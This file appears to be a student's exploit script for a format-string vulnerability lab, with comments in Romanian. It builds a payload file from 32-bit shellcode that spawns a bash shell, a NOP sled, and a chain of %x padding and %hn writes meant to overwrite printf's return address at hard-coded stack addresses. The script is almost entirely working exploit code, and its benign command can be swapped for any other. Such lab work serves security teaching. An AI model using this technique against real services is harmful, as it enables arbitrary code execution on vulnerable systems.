#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = 344              #dupa toate variabilele pornite
content[start:start + len(shellcode)] = shellcode

############################################################
#    Construct the format string here
############################################################
##serverul tipareste the addres o frame pointer => 0xffffd338 care e pusa imediat pe stiva
## adresa de retur a lui pritnf este deci => 0xffffd334
#incercam sa suprascriem valoarea adresei de retur cu adresa de unde incepe shellcode-ul in buffer, care incepe cu 0xffffd410 => + formatori +> ffffd5f8 =>adresa 
# inceputului de shelcode
##scriem adresa 0xffffd334 la inceput 
address1  = 0xffffd058                       # prima adresa a valorii
content[0:4]  =  (address1).to_bytes(4,byteorder='little')   # se pune adresa in stringul de input
dummy = "xxxx".encode('latin-1')                             # se formeaza un octet pe care il afisam intre cei doi specifcatori %hn si %hn cu %x 
                                                             # si padding-ul corespunzator constructiei valorii pentru a doua adresa
content[4:8] = dummy
address2  =  0xffffd056                                      #a doua adresa a valorii
content[8:12]  =  (address2).to_bytes(4,byteorder='little')   #se pune adresa in stringul de input

                                                              #pana aici vor fi 4 + 4 + 4 = 12 caractere afisate
s = "%.8x_"*62                                                #se acceseaza cei 62 de octeti, urmand ca la al 63-lea sa i se adauge padding pana cand
fmt  = (s).encode('latin-1')                                  #se ajunge la un numar de 0xAABB octeti afisati (43707)
content[12:12+len(fmt)] = fmt                                 # vor fi 62 * 9 = 558 de caractere afiate => PANA ACUM SUNT 570 de caractere
intermediate_length = 12 + len(fmt)                                              
                                                              #mai trebuie 0xd2a0 = 53920=> 53920 - 570 = 53350
fmt_64 = ("%.53350x").encode('latin-1')                       #cel de-al 63-specificator va avea un padding care sa acopere cele 53350 ramase
content[intermediate_length:intermediate_length+len(fmt_64)] = fmt_64 
intermediate_length = intermediate_length + len(fmt_64)       #se recalculeaza valoarea de sfarsit a sirului
###################
#se pune primul %hn
###################
fmt_hn =  ("%hn").encode('latin-1')                           #se pune primul speficator de tipu %hn care va copia in prima adresa valoarea 0xffff
content[intermediate_length: intermediate_length +len(fmt_hn)] = fmt_hn
intermediate_length = intermediate_length + len(fmt_hn)
##########################################
#se pune paddingul necesare pentru afisarea caracterelor 0xffff-0xd2a0 = 2D5F => 11615 de caractere trebuie afisate
ftm_between = ("%.11615x").encode('latin-1') 
content[intermediate_length: intermediate_length +len(ftm_between)] = ftm_between
intermediate_length = intermediate_length + len(ftm_between)
###################
#se al doilea %hn
###################
fmt_hn =  ("%hn").encode('latin-1')                        #se pune al doilea speficator de tipul %hn care va copia in prima adresa valoarea 0xCCDD
content[intermediate_length: intermediate_length +len(fmt_hn)] = fmt_hn

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
